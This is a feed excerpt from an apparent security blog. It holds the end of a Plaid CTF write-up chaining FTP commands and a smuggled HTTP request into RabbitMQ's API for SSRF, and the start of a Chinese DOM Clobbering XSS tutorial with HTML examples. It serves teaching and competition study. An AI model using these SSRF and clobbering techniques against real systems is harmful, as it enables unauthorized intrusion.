class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">channel.consume(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  channel.ack(msg);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());</span><br><span class="line">    <span class="hljs-keyword">await</span> transport.sendMail({</span><br><span class="line">      <span class="hljs-keyword">from</span>: <span class="hljs-string">&quot;plaid2020problem@gmail.com&quot;</span>,</span><br><span class="line">      subject: <span class="hljs-string">&quot;Your Account&quot;</span>,</span><br><span class="line">      ...data,</span><br><span class="line">    });</span><br><span class="line">  } <span class="hljs-keyword">catch</span> (e) {</span><br><span class="line">    <span class="hljs-built_in">console</span>.error(e);</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. </p><p>So it seems we can control what nodemailer send through rabbitmq&#x2019;s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF!"></a>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><img src="/images/plaid-ctf/3.png" alt></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/exchanges/%2f/amq%2edefault/publish</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: 172.32.56.72:15672</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">authorization</span>: Basic dGVzdDp0ZXN0</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 300</span><br><span class="line"></span><br><span class="line">{&quot;properties&quot;:{},&quot;routing_key&quot;:&quot;email&quot;,&quot;payload&quot;:&quot;your_payload&quot;,&quot;payload_encoding&quot;:&quot;base64&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the TCP connection is not persisted, we can&#x2019;t get the response of rabbitmq server and most importantly we can&#x2019;t add a new message in rabbitmq queue. </p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><img src="/images/plaid-ctf/3.png" alt></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><img src="/images/plaid-ctf/4.png" alt></p><p>Interesting challange! Hope u enjoy!</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</id>
        <title><![CDATA[‰ΩøÁî® Dom Clobbering Êâ©Â±ï XSS]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"><![CDATA[<html><head></head><body><p>&#x524D;&#x51E0;&#x5929; PortSwigger &#x53D1;&#x5E03;&#x4E86; <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019" target="_blank" rel="noopener">Top 10 web hacking techniques of 2019</a>&#xFF0C;&#x699C;&#x4E0A;&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;p&#x725B;&#x4E5F;&#x80AF;&#x5B9A;&#x4F1A;&#x5728;&#x5C0F;&#x5BC6;&#x5708;&#x505A;&#x5206;&#x4EAB;&#x7684;&#xFF08;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BDD;&#x672C;&#x83DC;&#x4E5F;&#x4F1A;&#x5728;&#x81EA;&#x5DF1;<a href="https://blog.zeddyu.info">&#x535A;&#x5BA2;</a>&#x505A;&#x505A;&#x5B66;&#x4E60;&#x5206;&#x4EAB;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x804A; Top 10 &#x6280;&#x672F;&#x4E86;&#xFF0C;&#x5C31;&#x770B;&#x770B;&#x5728; Top 10 &#x63D0;&#x540D;&#x7ED3;&#x679C;&#x6CA1;&#x4E0A;&#x699C;&#x4F46;&#x662F;&#x4F9D;&#x65E7;&#x5F88;&#x6709;&#x610F;&#x601D;&#x7684;&#x6280;&#x672F; Dom Clobbering&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p></blockquote><a id="more"></a><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>From <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN Web Docs</a>:</p><blockquote><p>&#x200B;    The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a href="http://www.w3.org/DOM/" target="_blank" rel="noopener">W3C DOM</a> and <a href="https://dom.spec.whatwg.org/" target="_blank" rel="noopener">WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM &#x6700;&#x521D;&#x662F;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6807;&#x51C6;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8BDE;&#x751F;&#x548C;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;&#x4E86;&#x8BB8;&#x591A;&#x7279;&#x6B8A;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5F88;&#x591A;&#x6D4F;&#x89C8;&#x5668;&#x4ECD;&#x7136;&#x652F;&#x6301;&#x5F02;&#x5E38;&#x7684; DOM &#x3002;</p><p>DOM &#x7684;&#x65E7;&#x7248;&#x672C;&#xFF08;&#x5373;DOM Level 0 &amp; 1&#xFF09;&#x4EC5;&#x63D0;&#x4F9B;&#x4E86;&#x6709;&#x9650;&#x7684;&#x901A;&#x8FC7; JavaScript &#x5F15;&#x7528;&#x5143;&#x7D20;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x4E9B;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x5143;&#x7D20;&#x5177;&#x6709;&#x4E13;&#x7528;&#x7684;&#x96C6;&#x5408;&#xFF08;&#x4F8B;&#x5982;<code>document.forms</code>&#xFF09;&#xFF0C;&#x800C;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Window</code>&#x548C;<code>Document</code>&#x5BF9;&#x8C61;&#x4E0A;&#x7684;<code>name</code>&#x5C5E;&#x6027;&#x548C;<code>id</code>&#x5C5E;&#x6027;&#x6765;&#x5F15;&#x7528;&#xFF0C;</p><p>&#x663E;&#x7136;&#xFF0C;&#x652F;&#x6301;&#x8FD9;&#x4E9B;&#x5F15;&#x7528;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x6DF7;&#x6DC6;&#xFF0C;&#x5373;&#x4F7F;&#x8F83;&#x65B0;&#x7684;&#x89C4;&#x8303;&#x8BD5;&#x56FE;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5411;&#x540E;&#x517C;&#x5BB9;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x884C;&#x4E3A;&#x90FD;&#x4E0D;&#x80FD;&#x8F7B;&#x6613;&#x66F4;&#x6539;&#x3002;&#x5E76;&#x4E14;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x95F4;&#x6CA1;&#x6709;&#x5171;&#x8BC6;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x9075;&#x5FAA;&#x4E0D;&#x540C;&#x7684;&#x89C4;&#x8303;&#xFF08;&#x751A;&#x81F3;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x6807;&#x51C6;&#xFF09;&#x3002;&#x663E;&#x7136;&#xFF0C;&#x7F3A;&#x4E4F;&#x6807;&#x51C6;&#x5316;&#x610F;&#x5473;&#x7740;&#x786E;&#x4FDD;DOM&#x7684;&#x5B89;&#x5168;&#x662F;&#x4E00;&#x9879;&#x91CD;&#x5927;&#x6311;&#x6218;&#x3002;</p><p>&#x7531;&#x4E8E;&#x975E;&#x6807;&#x51C6;&#x5316;&#x7684; DOM &#x884C;&#x4E3A;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x5411;&#x5404;&#x79CD; DOM &#x5143;&#x7D20;&#x6DFB;&#x52A0; name &amp; id &#x5C5E;&#x6027;&#xFF0C;&#x4F5C;&#x4E3A;&#x5BF9;&#x6587;&#x6863;&#x6216;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x5F15;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x6389; document&#x539F;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x6216;&#x8005;&#x52AB;&#x6301;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x540C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7279;&#x522B;&#x6807;&#x6CE8;&#xFF0C;&#x5747;&#x9ED8;&#x8BA4;&#x5728; <strong>Chrome 80.0.3987.116</strong> &#x7248;&#x672C;&#x4E0A;&#x8FDB;&#x884C;&#x3002; </p><p>Dom Clobbering &#x5C31;&#x662F;&#x4E00;&#x79CD;&#x5C06; HTML &#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x9875;&#x9762;&#x4E2D;&#x4EE5;&#x64CD;&#x7EB5; DOM &#x5E76;&#x6700;&#x7EC8;&#x66F4;&#x6539;&#x9875;&#x9762;&#x4E0A; JavaScript &#x884C;&#x4E3A;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x65E0;&#x6CD5;&#x76F4;&#x63A5; XSS &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F80; DOM Clobbering &#x8FD9;&#x65B9;&#x5411;&#x8003;&#x8651;&#x4E86;&#x3002; </p><h2 id="Simple-Example"><a href="#Simple-Example" class="headerlink" title="Simple Example"></a>Simple Example</h2><p>&#x5176;&#x5B9E; Dom Clobbering &#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x51E0;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x80FD;&#x77E5;&#x9053;&#x5B83;&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x4E86;&#x7684;&#x3002;</p><h3 id="Exmaple-1-Create"><a href="#Exmaple-1-Create" class="headerlink" title="Exmaple 1 - Create"></a>Exmaple 1 - Create</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png" alt></p><p>&#x4ECE;&#x56FE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x5C5E;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>document</code>&#x6216;&#x8005;<code>window</code>&#x5BF9;&#x8C61;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x3002;</p><h3 id="Example-2-Overwrite"><a href="#Example-2-Overwrite" class="headerlink" title="Example 2 - Overwrite"></a>Example 2 - Overwrite</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>document.cookie</code>&#x5DF2;&#x7ECF;&#x88AB;&#x6211;&#x4EEC;&#x7528; img &#x6807;&#x7B7E;&#x7ED9;&#x8986;&#x76D6;&#x4E86;</p><h3 id="Example-3-Overwrite2"><a href="#Example-3-Overwrite2" class="headerlink" title="Example 3 - Overwrite2"></a>Example 3 - Overwrite2</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x591A;&#x5C42;&#x8986;&#x76D6;&#x6389;&#x4E86;<code>document.body.appendChild</code>&#x65B9;&#x6CD5;&#x3002;</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53BB;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6; document &#x6216;&#x8005; window &#x5BF9;&#x8C61;&#x7684;&#x67D0;&#x4E9B;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x4E3E;&#x7684;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x5229;&#x7528;&#x6807;&#x7B7E;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6;&#x6700;&#x7EC8;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElment</code>&#x5BF9;&#x8C61;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png" alt></p><p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x66F4;&#x9700;&#x8981;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x8FDB;&#x884C; fuzz &#x5F97;&#x5230;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>toString</code>&#x65B9;&#x6CD5;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x6807;&#x7B7E;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Object</span>.getOwnPropertyNames(<span class="hljs-built_in">window</span>)</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.match(<span class="hljs-regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-built_in">window</span>[p])</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="hljs-built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E24;&#x79CD;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#xFF1A;<code>HTMLAreaElement (&lt;area&gt;)</code>&amp; <code>HTMLAnchorElement (&lt;a&gt;)</code>&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#x6211;&#x4EEC;&#x90FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>href</code>&#x5C5E;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png" alt></p><h3 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h3><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x662F;<code>x.y</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5462;&#xFF1F;&#x4E24;&#x5C42;&#x7ED3;&#x6784;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E0A;&#x8FF0;&#x7684;&#x529E;&#x6CD5;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&apos;1:hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x65E0;&#x8BBA;&#x7B2C;&#x4E00;&#x4E2A;&#x6807;&#x7B7E;&#x600E;&#x4E48;&#x7EC4;&#x5408;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x53EA;&#x662F;<code>undefined</code>&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x52A0;&#x5165;&#x5F15;&#x5165; name &#x5C5E;&#x6027;&#x5C31;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x6548;&#x679C;&#x3002;</p><p><code>HTMLCollection</code>&#x662F;&#x4E00;&#x4E2A;<code>element</code>&#x7684;&#x201C;&#x96C6;&#x5408;&#x201D;&#x7C7B;&#xFF0C;&#x5728;&#x6700;&#x65B0;&#x7684; <a href="https://dom.spec.whatwg.org/#interface-htmlcollection" target="_blank" rel="noopener">Dom &#x6807;&#x51C6;</a>&#x4E2D; IDL &#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]<br>interface HTMLCollection {<br>  readonly attribute unsigned long length;<br>  getter Element? item(unsigned long index);<br>  getter Element? namedItem(DOMString name);<br>};</p></blockquote><p>&#x6587;&#x4E2D;&#x4E5F;&#x63D0;&#x5230;&#x4E86;</p><blockquote><p>&#x200B;    <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x5386;&#x53F2;&#x4EA7;&#x7269;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x4ECA;&#x5929;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x53EA;&#x662F;&#x5BF9;&#x4E8E; API &#x6807;&#x51C6;&#x8BBE;&#x8BA1;&#x8005;&#x4E0D;&#x63A8;&#x8350;&#x518D;&#x4F7F;&#x7528;&#x3002;</p><p>&#x5173;&#x4E8E;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#xFF1A;</p><blockquote><p>collection . <code>length</code></p><p>&#x200B;    Returns the number of <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> in the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>&#x200B;    Returns the <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with index index from the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>. The <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> are sorted in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>&#x200B;    Returns the first <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with <a href="https://dom.spec.whatwg.org/#concept-id" target="_blank" rel="noopener">ID</a> or name name from the collection.</p></blockquote><p>&#x8BA9;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x5176;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5148;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#xFF0C;&#x518D;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:hasaki&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png" alt></p><h3 id="HTML-Relationships"><a href="#HTML-Relationships" class="headerlink" title="HTML Relationships"></a>HTML Relationships</h3><p>&#x518D;&#x8005;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; HTML &#x6807;&#x7B7E;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7684;&#x5173;&#x7CFB;&#x6765;&#x6784;&#x5EFA;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> log=[];</span><br><span class="line"><span class="hljs-keyword">var</span> html = [<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;abbr&quot;</span>,<span class="hljs-string">&quot;acronym&quot;</span>,<span class="hljs-string">&quot;address&quot;</span>,<span class="hljs-string">&quot;applet&quot;</span>,<span class="hljs-string">&quot;area&quot;</span>,<span class="hljs-string">&quot;article&quot;</span>,<span class="hljs-string">&quot;aside&quot;</span>,<span class="hljs-string">&quot;audio&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;basefont&quot;</span>,<span class="hljs-string">&quot;bdi&quot;</span>,<span class="hljs-string">&quot;bdo&quot;</span>,<span class="hljs-string">&quot;bgsound&quot;</span>,<span class="hljs-string">&quot;big&quot;</span>,<span class="hljs-string">&quot;blink&quot;</span>,<span class="hljs-string">&quot;blockquote&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;br&quot;</span>,<span class="hljs-string">&quot;button&quot;</span>,<span class="hljs-string">&quot;canvas&quot;</span>,<span class="hljs-string">&quot;caption&quot;</span>,<span class="hljs-string">&quot;center&quot;</span>,<span class="hljs-string">&quot;cite&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;col&quot;</span>,<span class="hljs-string">&quot;colgroup&quot;</span>,<span class="hljs-string">&quot;command&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;datalist&quot;</span>,<span class="hljs-string">&quot;dd&quot;</span>,<span class="hljs-string">&quot;del&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>,<span class="hljs-string">&quot;dfn&quot;</span>,<span class="hljs-string">&quot;dialog&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;div&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;dt&quot;</span>,<span class="hljs-string">&quot;element&quot;</span>,<span class="hljs-string">&quot;em&quot;</span>,<span class="hljs-string">&quot;embed&quot;</span>,<span class="hljs-string">&quot;fieldset&quot;</span>,<span class="hljs-string">&quot;figcaption&quot;</span>,<span class="hljs-string">&quot;figure&quot;</span>,<span class="hljs-string">&quot;font&quot;</span>,<span 